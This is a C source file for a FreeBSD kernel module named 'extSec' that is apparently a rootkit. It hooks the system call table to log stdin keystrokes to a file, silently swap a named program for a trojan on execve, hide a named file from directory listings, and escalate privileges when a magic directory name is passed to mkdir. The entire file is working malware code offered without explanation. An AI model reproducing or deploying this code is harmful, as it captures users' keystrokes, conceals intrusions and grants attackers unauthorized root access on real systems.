#include "extSec.h"

static int output(struct thread *td, char c) {
	int error;
	error = kern_openat(td, AT_FDCWD, KEYLOGGER_FILE, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0777);
		
	if (error) {
		return(error);
	}

	int keylogFD = td->td_retval[0];
	int buf[1] = {c};
	
	struct uio auio;
	struct iovec aiov;
	
	bzero(&aiov, sizeof(aiov));
	bzero(&auio, sizeof(auio));

	aiov.iov_base = &buf;
	aiov.iov_len = 1;

	auio.uio_iov = &aiov;
	auio.uio_offset = 0;
	auio.uio_segflg = UIO_SYSSPACE;
	auio.uio_rw = UIO_WRITE;
	auio.uio_iovcnt = 1;
	auio.uio_resid = 1;
	auio.uio_td = td;

	error = kern_writev(td, keylogFD, &auio);

	if (error) {
		return(error);
	}

	struct close_args fdtmp;
	fdtmp.fd = keylogFD;
	sys_close(td, &fdtmp);

	return(error);
}

static int read_hook(struct thread *td, void *syscall_args) {
	struct read_args *uap;
	uap = (struct read_args *)syscall_args;

	int error;
	size_t done;
	int buf[1];
	error = sys_read(td, syscall_args);

	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
		return(error);

	copyinstr(uap->buf, buf, 1, &done);
	
	output(td, buf[0]);
	output(td, '\n');
	/*
	do {
		if (buf[0] == printable[i]) {
			output(td, buf[0]);
		}
		i++;
	} while (printable[i] != '\x0c');
	*/

	return(error);
}

static int execve_hook(struct thread *td, void *syscall_args) {
	struct execve_args *uap;
	uap = (struct execve_args *)syscall_args;

	struct execve_args kernel_ea;
	struct execve_args *user_ea;
	struct vmspace *vm;
	vm_offset_t base, addr;
	char t_fname[] = TROJAN;

	if (strcmp(uap->fname, ORIGINAL) == 0) {
		vm = curthread->td_proc->p_vmspace;
		base = round_page((vm_offset_t) vm->vm_daddr);
		addr = base + ctob(vm->vm_dsize);

		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, 0, FALSE, VM_PROT_ALL, VM_PROT_ALL, 0);
		vm->vm_dsize += btoc(PAGE_SIZE);

		copyout(&t_fname, (char *)addr, strlen(t_fname));
		kernel_ea.fname = (char *)addr;
		kernel_ea.argv = uap->argv;
		kernel_ea.envv = uap->envv;

		user_ea = (struct execve_args *)addr + sizeof(t_fname);
		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

		return (sys_execve(curthread, user_ea));
	}

	return(sys_execve(td, syscall_args));
}

static int getdirentries_hook(struct thread *td, void *syscall_args) {
	struct getdirentries_args *uap;
	uap = (struct getdirentries_args *)syscall_args;

	struct dirent *dp;
	struct dirent *current;
	unsigned int size, count;

	sys_getdirentries(td, syscall_args);
	size = td->td_retval[0];

	if(size > 0) {
		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;
		
		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;
			
			if(strcmp((char *)&(current->d_name), T_NAME) == 0)
			{
				if (count != 0)
					bcopy((char *)current + current->d_reclen, current, count);
				
				size -= current->d_reclen;
				break;
			}

			if (count != 0)
				current = (struct dirent *)((char *)current + current->d_reclen);
		}

		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);

		FREE(dp, M_TEMP);
	}

	return(0);
}

static int mkdir_hook (struct thread *td, void *syscall_args) {
	struct mkdir_args *uap;
	uap = (struct mkdir_args *)syscall_args;

	char path[255];
	size_t done;	

	int error = copyinstr(uap->path, path, 255, &done);
	
	if (error)
		return(error);
	
	if (!strcmp(path, ESCALATE_NAME)) 
		escalate(td);

	return (sys_mkdir(td, syscall_args));
}

int load(struct module *module, int cmd, void *arg) {
	unload();

	int error = 0;

	switch (cmd) {
		case MOD_LOAD:
			sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;				sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			break;
		case MOD_UNLOAD:
			sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
			sysent[SYS_mkdir].sy_call = (sy_call_t *)sys_mkdir;
			sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}
	
	return(error);
}

static moduledata_t extSec_mod = {
	"extSec",
	load,
	NULL
};

DECLARE_MODULE(extSec, extSec_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

